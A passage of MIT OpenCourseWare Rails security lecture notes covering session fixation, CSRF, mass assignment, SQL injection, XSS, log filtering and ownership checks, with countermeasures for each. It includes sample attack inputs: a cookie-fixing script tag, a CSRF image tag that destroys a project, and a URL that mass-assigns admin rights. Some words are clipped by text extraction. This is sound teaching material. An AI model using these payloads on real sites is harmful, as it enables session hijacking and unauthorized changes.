necessary for the attacker to steal the session id\nafterwards. Here is how this attack works:\n1.\nThe attacker creates a valid session id: He loads the login page of the web application\nwhere he wants to fix the session, and takes the session id in the cookie from the\nresponse (see number 1 and 2 in the image).\n2.\nHe possibly maintains the session. Expiring sessions, for example every 20 minutes,\ngreatly reduces the timeframe for attack. Therefore he accesses the web application\nfrom time to time in order to keep the session alive.\n3.\nNow the attacker will force the user's browser into using this session id (see number 3 in\nthe image). As you may not change a cookie of another domain (because of the same\norigin policy), the attacker has to run a JavaScript from the domain of the target web\napplication. Injecting the JavaScript code into the application by XSS accomplishes this\nattack. Here is an example:\n<script>document.cookie=\"_session_id=16d5b78abb28e3d6206b60f22a0\n3c8d9\";</script>.\n4.\nThe attacker lures the victim to the infected page with the JavaScript code. By viewing\nthe page, the victim's browser will change the session id to the trap session id.\n5.\nAs the new trap session is unused, the web application will require the user to\n \n \n\nauthenticate.\n6.\nFrom now on, the victim and the attacker will couse the web application with the same\nsession: The session became valid and the victim didn't notice the attack.\nCountermeasures\n-- One line of code will protect you from session fixation.\nThe most effective countermeasure is to issue a new session identifier and declare the old one\ninvalid after a successful login. That way, an attacker cannot use the fixed session identifier. This\nis a good countermeasure against session hijacking, as well. Here is how to create a new\nsession in Rails:\nreset_session\n\nCSRF\n-- This attack method works by including malicious code or a link in a page that accesses a web\napplication that the user is believed to have authenticated. If the session for that web application\nhas not timed out, an attacker may execute unauthorized commands.\nMost Rails applications use cookiebased sessions. Either they store the session id in the cookie\nand have a serverside session hash, or the entire session hash is on the clientside. In either\ncase the browser will automatically send along the cookie on every request to a domain, if it can\nfind a cookie for that domain. The controversial point is, that it will also send the cookie, if the\nrequest comes from a site of a different domain. Let's start with an example:\n●\nBob browses a message board and views a post from a hacker where there is a\ncrafted HTML image element. The element references a command in Bob's project\nmanagement application, rather than an image file.\n●\n<img src=\"http://www.webapp.com/project/1/destroy\">\n●\nBob's session at www.webapp.com is still alive, because he didn't log out a few\nminutes ago.\n●\nBy viewing the post, the browser finds an image tag. It tries to load the suspected\nimage from www.webapp.com. As explained before, it will also send along the cookie\n\nwith the valid session id.\n●\nThe web application at www.webapp.com verifies the user information in the\ncorresponding session hash and destroys the project with the ID 1. It then returns a\nresult page which is an unexpected result for the browser, so it will not display the\nimage.\n●\nBob doesn't notice the attack -- but a few days later he finds out that project number\none is gone.\nCountermeasures\nprotect_from_forgery :secret => \"1234567890123456789034567890...\"\nThis will automatically include a security token, calculated from the current session and the\nserverside secret, in all forms and Ajax requests generated by Rails. You won't need the\nsecret, if you use CookieStorage as session storage. If the security token doesn't match\nwhat was expected, the session will be reset.\nHackers Love Mass Assignment\n-- Without any precautions Model.new(params[:model]) allows attackers to set any database\ncolumn's value.\nThe massassignment feature may become a problem, as it allows an attacker to set any\nmodel's attributes by manipulating the hash passed to a model's new() method:\ndef signup\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\n@user = User.new(params[:user])\nend\nMassassignment saves you much work, because you don't have to set each value individually.\nSimply pass a hash to the new method, or assign_attributes= a hash value, to set the\nmodel's attributes to the values in the hash. The problem is that it is often used in conjunction\nwith the parameters (params) hash available in the controller, which may be manipulated by an\nattacker. He may do so by changing the URL like this:\nhttp://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1\nThis will set the following parameters in the controller:\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\nNote that this vulnerability is not restricted to database columns. Any setter method, unless\nexplicitly protected, is accessible via the attributes= method. In fact, this vulnerability is\n\nextended even further with the introduction of nested mass assignment (and nested object\nforms) in Rails 2.3. The accepts_nested_attributes_for declaration provides us the\nability to extend mass assignment to model associations (has_many, has_one,\nhas_and_belongs_to_many). For example:\nclass Person < ActiveRecord::Base\nhas_many :children\naccepts_nested_attributes_for :children\nend\nclass Child < ActiveRecord::Base\nbelongs_to :person\nend\nAs a result, the vulnerability is extended beyond simply exposing column assignment, allowing\nattackers the ability to create entirely new records in referenced tables (children in this case).\nCountermeasures\nTo avoid this, Rails provides two class methods in your Active Record class to control access to\nyour attributes. The attr_protected method takes a list of attributes that will not be accessible\nfor massassignment. For example:\nattr_protected :admin\nattr_protected also optionally takes a role option using :as which allows you to define multipl\nmassassignment groupings. If no role is defined then attributes will be added to the :default rol\nattr_protected :last_login, :as => :admin\nA much better way, because it follows the whitelistprinciple, is the attr_accessible method. I\nis the exact opposite of attr_protected, because it takes a list of attributes that will be\naccessible. All other attributes will be protected. This way you won't forget to protect attributes\nwhen adding new ones in the course of development. Here is an example:\nattr_accessible :name\nattr_accessible :name, :is_admin, :as => :admin\ne\ne.\nt\nIf you want to set a protected attribute, you will to have to assign it individually:\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\n@user = User.new(params[:user])\n@user.admin # => false # not mass-assigned\n@user.admin = true\n\n@user.admin # => true\nWhen assigning attributes in Active Record using attributes= the :default role will be used. To\nassign attributes using different roles you should use assign_attributes which accepts an\noptional :as options parameter. If no :as option is provided then the :default role will be used. You\ncan also bypass massassignment security by using the :without_protection option. Here is\nan example:\n@user = User.new\n@user.assign_attributes({ :name => 'Josh', :is_admin => true })\n@user.name # => Josh\n@user.is_admin # => false\n@user.assign_attributes({ :name => 'Josh', :is_admin => true }, :as => :admin)\n@user.name # => Josh\n@user.is_admin # => true\n@user.assign_attributes({ :name => 'Josh', :is_admin => true },\n:without_protection => true)\n@user.name # => Josh\n@user.is_admin # => true\nIn a similar way, new, create, create!, update_attributes, and\nupdate_attributes! methods all respect massassignment security and accept either :as\nor :without_protection options. For example:\n@user = User.new({ :name => 'Sebastian', :is_admin => true }, :as => :admin)\n@user.name # => Sebastian\n@user.is_admin # => true\n@user = User.create({ :name => 'Sebastian', :is_admin => true },\n:without_protection => true)\n@user.name # => Sebastian\n@user.is_admin # => true\nA more paranoid technique to protect your whole project would be to enforce that all models\ndefine their accessible attributes. This can be easily achieved with a very simple application\nconfig option of:\nconfig.active_record.whitelist_attributes = true\nThis will create an empty whitelist of attributes available for massassignment for all models in\n\nyour app. As such, your models will need to explicitly whitelist or blacklist accessible parameters\nby using an attr_accessible or attr_protected declaration. This technique is best applied at\nthe start of a new project. However, for an existing project with a thorough set of functional tests,\nit should be straightforward and relatively quick to use this application config option; run your\ntests, and expose each attribute (via attr_accessible or attr_protected) as dictated by your\nfailing tests.\n\nInjection\n-- Injection is a class of attacks that introduce malicious code or parameters into a web\napplication in order to run it within its security context. Prominent examples of injection are\ncrosssite scripting (XSS) and SQL injection.\nInjection is very tricky, because the same code or parameter can be malicious in one context,\nbut totally harmless in another. A context can be a scripting, query or programming language, the\nshell or a Ruby/Rails method.\nSQL Injection\nOne of the first rules of security is to never trust input from users. In Rails this means taking care\nof the items in the params hash. The user can control both the keys and the values in the\nparams hash, so all input must be considered suspicious.\nOne of the most common security issues is known as SQL injection. This happens when user\ninput is placed directly into a SQL query. If a user knows that their input is being directly inserted\ninto a query they can deliberately write input that can retrieve data that they should not see or\neven alter or destroy data in the database.\nCountermeasures\nInstead of passing a string to the conditions option, you can pass an array to sanitize tainted\nstrings like this:\nModel.where(\"login = ? AND password = ?\", user_name, password).first\nModel.where(:login => user_name, :password => password).first\nCourtesy of XKCD. License: Creative Commons BY NC 2.5 http://xkcd.com/license.html.\n\nCross Site Scripting (XSS)\nCrosssite scripting is another common security issue to consider when developing web\napplications. It happens when you allow the users of your site to enter HTML or JavaScript\ndirectly. If you're not escaping the input that's entered by users, your site will be vulnerable to\nattack.\nAssume you're working on a question, answer site (like Quora). If we enter JavaScript into a\nnew question, surrounded by <script> tags, that script will be executed when the page reloads\nand every time it it viewed afterwards. For example if we entered <script>alert('hello')</script>\ninto a new question and submitted it, every subsequent time the page is viewed the user would\nsee an alert box.\nCausing an alert box to be shown on a page is annoying, but crosssite scripting can be used for\nmuch more malicious purposes. For example it could be used to read the cookies for the site's\nother users. The cookie could easily be sent to a remote server where the session id information\nin the cookie could be used to hijack another user's session.\nCountermeasures\nBefore rails 3, in order to stop these attacks you needed to escape any user input before you\ndisplay it on the screen. Instead of taking the question's content directly from the database and\noutputting it into the HTML stream, Rails provides a method simply called h to escape the\ncontent before it is output.\n<% @task.comments.each do |comment| %>\n<p><%= h(comment.content) %></p>\n<% end %>\nIn Rails 3, however, output is escaped automatically so there's no need to put the h method in\nyour views. The following snippets will result in the same output in Rails 3 (notice the difference\nis the h method).\n<div class=\"question\">\n<strong><%= link_to question.name, question.url %></strong>\n<p><%= question.content %></p>\n</div>\n<div class=\"question\">\n<strong><%= link_to h(question.name), question.url %></strong>\n<p><%= h question.content %></p>\n</div>\nThe html for both snippets looks the same and the output hasn't been doubleescaped. Rails is\n\nclever here; even if we use the h method it will escape the script tag only the once.\nIf we trust the content that the user enters, say they're an administrative user, and we want to\ndisplay exactly what they enter then we can use the new raw method to do that.\nRails 3 has a concept of HTMLsafe strings. This means that we can check if any string is safe\nto output as HTML by calling the new method html_safe? on it. We can mark a string as\nbeing HTMLsafe by calling the html_safe method on it. No actual escaping goes on here. All\nthat happens is that a boolean property is set against a string to determine whether it should be\nescaped before being output.\nSo how does this apply in our view template? Well, Rails looks at each piece of output and sees\nif it's marked as HTMLsafe. If it's not then it will be automatically escaped when it is output to the\nview. If it is safe then it is passed through without being escaped. If we use the h method to\nescape a string it will perform the escaping and mark the string as HTMLsafe. This means that\nRails 3 will see that the string is safe and not escape it again.\nWhen the raw method is used on a string it will be marked as HTMLsafe but not escaped,\nensuring that the string's content is passed to the output without being changed.\nLogging\n-- Tell Rails not to put passwords in the log files.\nBy default, Rails logs all requests being made to the web application. But log files can be a huge\nsecurity issue, as they may contain login credentials, credit card numbers et cetera. When\ndesigning a web application security concept, you should also think about what will happen if an\nattacker got (full) access to the web server. Encrypting secrets and passwords in the database\nwill be quite useless, if the log files list them in clear text. You can filter certain request\nparameters from your log files by appending them to config.filter_parameters in the\napplication configuration. These parameters will be marked [FILTERED] in the log.\nconfig.filter_parameters << :password\nConsider the following. Your application has signup and login forms in which users can enter\ntheir username and password. By default, Rails will store all form parameters as plain text which\nmeans that when we log in, our username and password are stored in the log file.\nWhile we've gone to the effort of encrypting our users' passwords in the database they are still\nclearly visible in the application's log file.\nOther field names can be added to the list of parameters if there are other fields that need to be\nfiltered.\n\nAuthorizing Ownership\nFor project 1, you were making a web analytics engine which allowed a site owner to view\nanalytics about his or her site. If we look at the page for a specific site in our application we can\nsee that the site's id is in the URL. Each user has their own collection of sites and we want to\nmake sure that one user cannot view another's sites.\nThe URL might be something like: http://localhost:3000/sites/1\nSite with ID 1 might belong to us, but what happens if we start altering the id? We now can\nguess other site IDs and see analytics. To fix this we need to look in our SitesController, in\nparticular at the code that gets the site from the database.\ndef show\n@project = Project.find(params[:id])\nend\nThis code will fetch any site by its `id`, with no authorisation to check that the site belongs to the\ncurrently loggedin user. There are a few ways we could do this, but one easy way is to use\nActiveRecord associations to get the site in the scope of the current user. As a site belongs_to a\nuser we can do this by changing the code above to:\ndef show\n@project = current_user.projects.find(params[:id])\nend\nThis will now scope the search to the sites that belong to the currently loggedin user. If we try to\nview another user's project now we'll see an error.\nActiveRecord::RecordNotFound in SitesController#show\nCouldn't find Site with ID=2 AND (\"sites\".user_id = 1)\nNote that the SQL condition in the error message has the current user's id in the select\ncondition. A RecordNotFound error means that when this application runs in production mode\nthe user will see a 404 page.\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    }
  ]
}